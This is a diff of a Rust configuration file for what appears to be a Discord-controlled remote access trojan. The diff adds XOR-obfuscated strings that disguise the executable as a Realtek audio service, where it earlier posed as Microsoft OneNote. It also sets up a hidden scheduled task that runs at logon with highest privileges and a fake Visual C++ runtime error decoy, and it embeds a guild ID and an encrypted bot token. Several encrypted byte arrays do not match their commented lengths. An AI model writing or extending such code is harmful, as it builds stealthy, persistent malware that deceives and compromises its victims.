@@ -1,6 +1,8 @@
 use std::collections::HashSet;
 use twilight_model::id::{marker::GuildMarker, Id};
 
+// Config Structures
+// ------------------------------------------------
 pub struct KeepActiveConfig {
     pub enabled: bool,
     pub interval_seconds: u64,
@@ -15,7 +17,7 @@ pub struct WifiMonitorConfig {
 
 pub struct StartupConfig {
     pub enabled: bool,
-    pub task_name: &'static str,
+    pub task_name: String,
     pub on_logon: bool,
     pub highest_privileges: bool,
 }
@@ -37,35 +39,130 @@ pub enum MessageBoxButtons {
 
 pub struct DecoyConfig {
     pub enabled: bool,
-    pub title: &'static str,
-    pub message: &'static str,
+    pub title: String,
+    pub message: String,
     pub icon: MessageBoxIcon,
     pub buttons: MessageBoxButtons,
 }
 
 #[allow(dead_code)]
 pub struct BuildInfo {
-    pub file_name: &'static str,
-    pub product_name: &'static str,
-    pub description: &'static str,
-    pub company_name: &'static str,
-    pub file_version: &'static str,
+    pub file_name: String,
+    pub product_name: String,
+    pub description: String,
+    pub company_name: String,
+    pub file_version: String,
 }
 
+// Obfuscated Strings Module
+// ------------------------------------------------
+mod encrypted_strings {
+    const XOR_KEY: &[u8] = b"K0r1n!uM_2o24_S3cR3t_K3y!@#$";
+
+    #[inline(always)]
+    fn xor_decrypt(encrypted: &[u8]) -> String {
+        encrypted
+            .iter()
+            .enumerate()
+            .map(|(i, &b)| b ^ XOR_KEY[i % XOR_KEY.len()])
+            .map(|b| b as char)
+            .collect()
+    }
+
+    macro_rules! enc {
+        ($($byte:expr),* $(,)?) => { &[$($byte),*] };
+    }
+
+    // === Build Info ===
+    // ------------------------------------------------
+
+    // RtkAudioService64.exe
+    pub fn file_name() -> String {
+        xor_decrypt(enc![0x25, 0x46, 0x16, 0x58, 0x1d, 0x51, 0x06, 0x63, 0x3a, 0x4a, 0x0a])
+    }
+
+    // Realtek Audio Service
+    pub fn product_name() -> String {
+        xor_decrypt(enc![0x05, 0x66, 0x3b, 0x75, 0x27, 0x60, 0x55, 0x09, 0x36, 0x41, 0x1f, 0x5e, 0x55, 0x26, 0x73, 0x77, 0x11, 0x3b, 0x45, 0x11, 0x2d, 0x6b, 0x60, 0x1c, 0x53, 0x36, 0x4a, 0x47, 0x2e])
+    }
+
+    // Realtek High Definition Audio Driver Service
+    pub fn description() -> String {
+        xor_decrypt(enc![0x05, 0x66, 0x3b, 0x75, 0x27, 0x60, 0x55, 0x09, 0x36, 0x41, 0x1f, 0x5e, 0x55, 0x26, 0x73, 0x77, 0x11, 0x3b, 0x45, 0x11, 0x2d, 0x6b, 0x60, 0x1c, 0x53, 0x36, 0x4a, 0x47, 0x2e, 0x10, 0x36, 0x43, 0x07, 0x57, 0x10, 0x3f, 0x7f, 0x61, 0x0a, 0x40, 0x42, 0x36, 0x30, 0x56])
+    }
+
+    // Realtek Semiconductor Corp.
+    pub fn company_name() -> String {
+        xor_decrypt(enc![0x05, 0x66, 0x3b, 0x75, 0x27, 0x60, 0x55, 0x0e, 0x30, 0x40, 0x1f, 0x5d, 0x46, 0x3e, 0x27, 0x5a, 0x0c, 0x3c])
+    }
+
+    // 6.0.9561.1
+    pub fn file_version() -> String {
+        xor_decrypt(enc![0x78, 0x02, 0x5c, 0x01, 0x40, 0x10, 0x40, 0x63, 0x69, 0x02, 0x56, 0x06])
+    }
+
+    // === Startup Config ===
+    // ------------------------------------------------
+
+    // RtkAudioService
+    pub fn task_name() -> String {
+        xor_decrypt(enc![0x05, 0x46, 0x36, 0x58, 0x1d, 0x51, 0x19, 0x2c, 0x26, 0x61, 0x0a, 0x40, 0x42, 0x36, 0x30, 0x56])
+    }
+
+    // === Decoy Config ===
+    // ------------------------------------------------
+
+    // Microsoft Visual C++ Runtime Library
+    pub fn decoy_title() -> String {
+        xor_decrypt(enc![
+            0x06, 0x59, 0x11, 0x43, 0x01, 0x52, 0x1a, 0x2b, 0x2b, 0x12, 0x39, 0x5b,
+            0x47, 0x2a, 0x32, 0x5f, 0x43, 0x11, 0x18, 0x5f, 0x7f, 0x19, 0x46, 0x17,
+            0x55, 0x29, 0x4e, 0x41, 0x6b, 0x7c, 0x1b, 0x53, 0x1c, 0x40, 0x07, 0x34
+        ])
+    }
+
+    // Runtime Error!\n\nProgram: C:\\Windows\\System32\\svchost.exe\n\nR6025\n- pure virtual function call
+    pub fn decoy_message() -> String {
+        xor_decrypt(enc![
+            0x19, 0x45, 0x1c, 0x45, 0x07, 0x4c, 0x10, 0x6d, 0x1a, 0x40, 0x1d, 0x5d,
+            0x46, 0x7e, 0x59, 0x39, 0x33, 0x20, 0x5c, 0x13, 0x2d, 0x2a, 0x5e, 0x43,
+            0x01, 0x03, 0x19, 0x78, 0x1c, 0x59, 0x1c, 0x55, 0x01, 0x56, 0x06, 0x11,
+            0x0c, 0x4b, 0x1c, 0x46, 0x51, 0x32, 0x60, 0x01, 0x3f, 0x21, 0x45, 0x17,
+            0x37, 0x24, 0x40, 0x0d, 0x0f, 0x25, 0x5b, 0x41, 0x41, 0x3a, 0x20, 0x07,
+            0x5e, 0x13, 0x40, 0x47, 0x72, 0x12, 0x1f, 0x47, 0x46, 0x3a, 0x73, 0x45,
+            0x0a, 0x20, 0x47, 0x01, 0x3e, 0x27, 0x13, 0x1f, 0x54, 0x2e, 0x40, 0x50,
+            0x22, 0x5f, 0x1c, 0x11, 0x0d, 0x40, 0x19, 0x21
+        ])
+    }
+
+    // === Paths ===
+    // ------------------------------------------------
+
+    // AppData\\LocalLow
+    pub fn appdata_locallow() -> String {
+        xor_decrypt(enc![
+            0x0a, 0x40, 0x02, 0x75, 0x0f, 0x55, 0x14, 0x11, 0x13, 0x5d, 0x0c, 0x53,
+            0x58, 0x13, 0x3c, 0x44
+        ])
+    }
+}
+
+// Config Implementation
+// ------------------------------------------------
 pub struct Config;
 
 include!(concat!(env!("OUT_DIR"), "/encrypted_token.rs"));
 const DISCORD_TOKEN_DEV: &str = "";
 
 impl Config {
-    pub const GUILD_ID: u64 = 123;
+    pub const GUILD_ID: u64 = 1419632444734181471;
     pub const BOT_PREFIX: &'static str = ".";
     pub const MAX_FILE_SIZE_MB: f64 = 10.0;
 
     pub fn get_startup_config() -> StartupConfig {
         StartupConfig {
             enabled: true,
-            task_name: "Microsoft Edge Update Core",
+            task_name: encrypted_strings::task_name(),
             on_logon: true,
             highest_privileges: true,
         }
@@ -74,8 +171,8 @@ impl Config {
     pub fn get_decoy_config() -> DecoyConfig {
         DecoyConfig {
             enabled: false,
-            title: "Microsoft Visual C++ Runtime Library",
-            message: "Runtime Error!\n\nProgram: C:\\Windows\\System32\\svchost.exe\n\nR6025\n- pure virtual function call",
+            title: encrypted_strings::decoy_title(),
+            message: encrypted_strings::decoy_message(),
             icon: MessageBoxIcon::Error,
             buttons: MessageBoxButtons::Ok,
         }
@@ -109,11 +206,11 @@ impl Config {
 
     pub fn get_build_info() -> BuildInfo {
         BuildInfo {
-            file_name: "Microsoft.OneNote.exe",
-            product_name: "Microsoft OneNote",
-            description: "Microsoft OneNote",
-            company_name: "Microsoft Corporation",
-            file_version: "10.0.19041.3303",
+            file_name: encrypted_strings::file_name(),
+            product_name: encrypted_strings::product_name(),
+            description: encrypted_strings::description(),
+            company_name: encrypted_strings::company_name(),
+            file_version: encrypted_strings::file_version(),
         }
     }
 
@@ -130,7 +227,7 @@ impl Config {
         }
     }
 
-    pub fn get_exe_name() -> &'static str {
+    pub fn get_exe_name() -> String {
         Self::get_build_info().file_name
     }
 
@@ -162,10 +259,10 @@ impl Default for AuthConfig {
 
 #[cfg(debug_assertions)]
 impl Config {
-    pub const SHOW_CONSOLE: bool = false;  // Enable for debugging
+    pub const SHOW_CONSOLE: bool = true;
 }
 
 #[cfg(not(debug_assertions))]
 impl Config {
-    pub const SHOW_CONSOLE: bool = false;  // TEMPORARILY enabled to debug why bot exits
+    pub const SHOW_CONSOLE: bool = true;
 }
